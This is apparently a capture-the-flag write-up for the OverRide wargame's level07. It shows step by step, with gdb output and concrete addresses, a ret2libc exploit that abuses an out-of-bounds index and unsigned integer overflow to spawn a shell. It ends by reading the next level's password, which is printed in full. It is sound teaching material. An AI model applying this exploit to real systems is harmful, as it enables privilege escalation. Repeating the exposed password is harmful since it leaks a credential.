RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07


We know that v6[400] where are stocked the number is : 
_BYTE v6[400]; // [esp+24h] [ebp-1B8h] BYREF --> 1b8 = 440

We also now that the bounds of v6[400] are not checked, we can write in it as we want (lower or higher than the buffer).

We can store number in a index, but the index has to be something
not modulo % 3 == 0.
We don t want to have the index
(uVar1 >> 0x18 == 0xb7) //0x18 = 24 | 0xb7 = 183
checks if the value of uVar1 after shifting it 24 bits to the right is not equal to 183.
If we don t have this two conditions, we can store a number at the index that we want.

So here we want to do some ret2libc like in the level04 to overwrite the Eip
with the address of system, the return adress of system with the address of exit and the argument of system with the address of /bin/sh.


But first we have to find the offset between the buffer and the return address of the main function.

1) We want to find the address of the Eip :

(gdb) disas main
[...]
0x080489bc <+665>:	movl   $0x0,0xc(%eax)
0x080489c3 <+672>:	movl   $0x0,0x10(%eax)
0x080489ca <+679>:	jmp    0x804884f <main+300>
0x080489cf <+684>:	nop
0x080489d0 <+685>:	mov    $0x0,%eax
0x080489d5 <+690>:	mov    0x1cc(%esp),%esi
0x080489dc <+697>:	xor    %gs:0x14,%esi
0x080489e3 <+704>:	je     0x80489ea <main+711>
0x080489e5 <+706>:	call   0x80484b0 <__stack_chk_fail@plt>
0x080489ea <+711>:	lea    -0xc(%ebp),%esp
0x080489ed <+714>:	pop    %ebx
0x080489ee <+715>:	pop    %esi
0x080489ef <+716>:	pop    %edi
0x080489f0 <+717>:	pop    %ebp
0x080489f1 <+718>:	ret    
End of assembler dump.

(gdb) b *0x080489ea			--> break after store the number to see the value of the Eip
Breakpoint 1 at 0x80489ea
(gdb) run
Starting program: /home/users/level07/level07 
----------------------------------------------------
Welcome to wil's crappy number storage service!   
----------------------------------------------------
Commands:                                          
	store - store a number into the data storage    
	read  - read a number from the data storage     
	quit  - exit the program                        
----------------------------------------------------
wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
Number: 11
Index: 10
Completed store command successfully
Input command: exit
Failed to do exit command
Input command: quit

Breakpoint 1, 0x080489ea in main ()
(gdb) i f
Stack level 0, frame at 0xffffd710:
eip = 0x80489ea in main; saved eip 0xf7e45513
Arglist at 0xffffd708, args: 
Locals at 0xffffd708, Previous frame's sp is 0xffffd710
Saved registers:
ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704, eip at 0xffffd70c


Stack level 0, frame at 0xffffd710: This indicates that the current stack frame is at memory address 0xffffd710.
eip = 0x80489ea in main; saved eip 0xf7e45513: The eip register (instruction pointer) contains the value 0x80489ea, indicating the current execution is in the main function. The saved eip value 0xf7e45513 represents the return address saved on the stack for the previous function.
Arglist at 0xffffd708, args:: This would normally display the arguments passed to the current function, but since there are no arguments listed, it shows as empty.
Locals at 0xffffd708, Previous frame's sp is 0xffffd710: This indicates that the local variables for the current frame are located at memory address 0xffffd708. The previous frame's stack pointer (sp) is at 0xffffd710.
Saved registers:: This section lists the values of certain registers that were saved on the stack during the function call. In this case:
ebx is stored at memory address 0xffffd6fc.
ebp is stored at memory address 0xffffd708.
esi is stored at memory address 0xffffd700.
edi is stored at memory address 0xffffd704.
eip (instruction pointer) is stored at memory address 0xffffd70c. --> perfect we have the Eip address

Eip = 0xffffd70c = 4294956812

2) We want to find the address of the buffer :

(gdb) p $ebp + 4 --> we now that ebp+4 is the return address
$2 = (void *) 0xffffd70c
(gdb) p $ebp + 8
$3 = (void *) 0xffffd710
(gdb) p $ebp + 12
$4 = (void *) 0xffffd714

(gdb) p $esp+0x24
$6 = (void *) 0xffffd544	--> we now that esp+24 is the address of the buffer (Look at hex_ray.c)

We display the addresses of ebp + 4, ebp + 8 and ebp + 12.
Look at stack_representation.png :
ebp + 4 is the return address, ebp + 8 is the Parameter 1 and ebp + 12 is the Parameter 2.


3) Find the offset between the buffer and the Eip :

>>> 0xffffd70c - 0xffffd544
456

The difference between the addresse of the buffer and the Eip is 456 bytes.
We have our offset !

4) Find the good index to put the address of system :

So we have 456 bytes to write before overwriting the Eip.
The index is in uint format so we have to write 114 bytes (456/4) to overwrite the Eip. (4 bytes = 1 uint).
(The unsigned integer type is uint. It takes 4 bytes of memory and allows expressing integers from 0 to 4294967295.)
So our index is 114 !

We have to test if we can put this index :

>>> 114 % 3
0

Oh damn... We go in the condition : (uVar2 % 3 == 0)
So we don t write the number...
puts(" *** ERROR! ***");
puts("   This index is reserved for wil!");
puts(" *** ERROR! ***");

We have to find another way to pass the condition, and have the same index.
We remember in the bonus1 of Rainfall, that we can use integer overflow/underflow.

But here we have the index in uint format, so we have to find the max value of uint :

uint max in c : 4294967295

Create a little program to test the integer overflow : test_uint.c

➜  Ressources git:(master) ✗ ./a.out 4294967295          
4294967295
➜  Ressources git:(master) ✗ ./a.out 4294967296
0
➜  Ressources git:(master) ✗ ./a.out 4294967297
1

Ok perfect we just have to add 456 to 4294967296 to have the same index :

Now we have to divide it by 4 because we are in uint format :
>>> ((4294967296 + 456) / 4)
or 
>>> ((4294967297) / 4 + 114)
1073741938

And verify with our script :
>>> 1073741938 * 4
4294967752
./a.out 4294967752
456					--> our offset of 456 bytes, its good

Perfect it works (456 / 4 = 114) !
Now we have to check if this number % 3 is different of 0 :
>>> 1073741938 % 3
1

Perfect, this problem is solved !

Check with our script decode.c if (uVar1 >> 0x18 == 0xb7) is false

./a.out 1073741938          
Value = 1073741938 | is Good% 

The value 1073741938 is good !


5) We have to find the address of system, exit and /bin/sh :

So let s find the address of system, exit and /bin/sh. (Like in level04 of override)

(gdb) b main
Breakpoint 1 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048729 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.

system --> 0xf7e6aed0 = 4159090384
exit --> 0xf7e5eb70 = 4159040368
/bin/sh --> 0xf7f897ec = 4160264172

6) We have to create our payload :

We have to create our payload with the address of system, exit and /bin/sh.

A) First we put the address of system in Eip (at the index 1073741938) :


level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully

B) Now we have to put the address of exit after the address of system,
The address of system is at index[114], so we have to put the address of exit at index[115] :

Check if index 115 is ok
>>> 115 % 3
1

Try with our script :
./a.out 115
Value = 115 | is Good%

Its ok !

Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully


C)Same thing for /bin/sh, we have to put it at index[116] :

>>> 116 % 3
2

./a.out 116   
Value = 116 | is Good%

it works !

 Number: 4160264172
 Index: 116
 Completed store command successfully

B bis) We also can put the the index of exit like for system :

>>> 115 * 4
460
>>> 4294967296 + 460
4294967756
>>> 4294967756 % 3
2
>>> 4294967756 / 4
1073741939

C bis) Not working
But not for /bin/sh because 4294967760 % 3 = 0
>>> 116 * 4
464
>>> 4294967296 + 464
4294967760
>>> 4294967760 % 3
0

Now we have to quit the while loop, and call, its going to system("/bin/sh") :

Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC

